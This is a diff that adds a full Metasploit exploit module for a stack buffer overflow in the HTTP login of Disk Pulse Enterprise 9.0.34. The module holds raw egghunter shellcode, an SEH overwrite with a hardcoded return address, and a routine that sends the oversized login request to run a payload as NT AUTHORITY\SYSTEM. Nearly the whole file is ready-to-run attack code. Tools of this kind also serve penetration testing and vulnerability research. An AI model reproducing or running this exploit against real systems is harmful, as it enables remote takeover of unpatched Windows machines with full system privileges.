@@ -1,0 +1,120 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::Remote::Egghunter
+  include Msf::Exploit::Remote::Seh
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Disk Pulse Enterprise Login Buffer Overflow',
+      'Description'    => %q{
+        This module exploits a stack buffer overflow in Disk Pulse Enterprise
+        9.0.34. If a malicious user sends a malicious HTTP login request,
+        it is possible to execute a payload that would run under the Windows
+        NT AUTHORITY\SYSTEM account. Due to size constraints, this module
+        uses the Egghunter technique.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Chris Higgins', # msf Module -- @ch1gg1ns
+          'Tulpa Security' # Original discovery -- @tulpa_security
+        ],
+      'References'     =>
+        [
+          [ 'EDB', '40452' ]
+        ],
+      'DefaultOptions' =>
+        {
+          'EXITFUNC' => 'thread'
+        },
+      'Platform'       => 'win',
+      'Payload'        =>
+        {
+          'BadChars' => "\x00\x0a\x0d\x26"
+        },
+      'Targets'        =>
+        [
+          [ 'Disk Pulse Enterprise 9.0.34',
+            {
+              'Ret' => 0x10013AAA, # pop ebp # pop ebx # ret 0x04 - libspp.dll
+              'Offset' => 12600
+            }
+          ],
+        ],
+      'Privileged'     => true,
+      'DisclosureDate' => 'Oct 03 2016',
+      'DefaultTarget'  => 0))
+
+    register_options([Opt::RPORT(80)], self.class)
+
+  end
+
+  def check
+    res = send_request_cgi({
+      'uri'    => '/',
+      'method' => 'GET'
+    })
+
+    if res and res.code == 200 and res.body =~ /Disk Pulse Enterprise v9\.0\.34/
+      return Exploit::CheckCode::Appears
+    end
+
+    return Exploit::CheckCode::Safe
+  end
+
+  def exploit
+    connect
+    eggoptions =
+    {
+      :checksum => true,
+      :eggtag => "w00t"
+    }
+
+    print_status("Generating exploit...")
+
+    sploit =  "username=admin"
+    sploit << "&password=aaaaa\r\n"
+
+    # Would like to use generate_egghunter(), looking for improvement
+    egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
+    egghunter += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
+
+    sploit << rand_text(target['Offset'] - payload.encoded.length)
+    sploit << "w00tw00t"
+    sploit << payload.encoded
+    sploit << make_nops(70)
+    sploit << rand_text(1614)
+    # Would like to use generate_seh_record(), looking for improvement
+    sploit << "\x90\x90\xEB\x0B"
+    sploit << "\x33\xA3\x01\x10"
+    sploit << make_nops(20)
+    sploit << egghunter
+    sploit << make_nops(7000)
+
+    # Total exploit size should be 21747
+    print_status("Total exploit size: " + sploit.length.to_s)
+    print_status("Triggering the exploit now...")
+    print_status("Please be patient, the egghunter may take a while...")
+
+    res = send_request_cgi({
+      'uri' => '/login',
+      'method' => 'POST',
+      'content-type' => 'application/x-www-form-urlencoded',
+      'content-length' => '17000',
+      'data' => sploit
+    })
+
+    handler
+    disconnect
+
+  end
+end
